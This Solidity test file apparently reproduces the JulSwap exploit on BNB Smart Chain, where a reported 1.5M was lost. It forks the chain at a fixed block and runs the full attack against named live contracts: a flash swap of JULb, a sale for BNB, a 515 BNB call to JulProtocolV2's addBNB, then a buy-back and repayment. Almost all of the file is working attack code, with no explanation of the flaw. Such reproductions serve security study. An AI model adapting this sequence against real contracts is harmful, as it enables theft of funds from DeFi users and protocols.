// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1.5M
// Attacker : https://bscscan.com/address/0xc3bc29941677db01b9645f7b8b72d27e3ba75372
// Attack Contract : https://bscscan.com/address/0x7c591aab9429af81287951872595a17d5837ce03
// Vulnerable Contract : https://bscscan.com/address/0x32dffc3fe8e3ef3571bf8a72c0d0015c5373f41d
// Attack Tx : https://bscscan.com/tx/0x1751268e620767ff117c5c280e9214389b7c1961c42e77fc704fd88e22f4f77a

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x32dffc3fe8e3ef3571bf8a72c0d0015c5373f41d#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;
interface IBNBRouter {
    function swapExactTokensForBNB(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
    function swapBNBForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
}

interface IJulProtocolV2 {
    function addBNB() external payable;
}

contract JulSwap is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 7_785_586;

    address internal BSCswapPair = 0x0242c5C11E3eaeb53298b45C7395DbaDc8a120E7;
    address internal JULb = 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D;
    address internal wBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal Router = 0xbd67d157502A23309Db761c41965600c2Ec788b2;
    address internal JulProtocolV2 = 0x41a2F9AB325577f92e8653853c12823b35fb35c4;
    address internal LP = 0xCcFE1A5b6e4aD16A4e41A9142673dEc829f39402;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        deal(wBNB, address(this), 1000 ether);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(0);
    }

    function testExploit() public balanceLog {
        //implement exploit code here
        uint256 amount0Out = 70_000_000_000_000_000_000_000;
        uint256 amount1Out = 0;
        IUniswapV2Pair(BSCswapPair).swap(amount0Out, amount1Out, address(this), "1");
    }

    function BSCswapCall(address, uint256 amount0, uint256, bytes memory) external {
        
        IERC20(JULb).approve(Router, type(uint256).max);

        address[] memory path0 = new address[](2);
        path0[0] = JULb;
        path0[1] = wBNB;
        IBNBRouter(Router).swapExactTokensForBNB(amount0, 1, path0, address(this), 1_622_156_211);

        IJulProtocolV2(JulProtocolV2).addBNB{value: 515 ether}();

        uint256 amountOut = 70_310_631_895_687_061_183_551;
        address[] memory path1 = new address[](2);
        path1[0] = wBNB;
        path1[1] = JULb;
        IBNBRouter(Router).swapBNBForExactTokens{value: 885.146882180525770269 ether}(amountOut, path1, address(this), 1_622_156_211);
        IERC20(JULb).transfer(BSCswapPair, 70_210_631_895_687_061_183_551);
    }

    receive() external payable {}
}
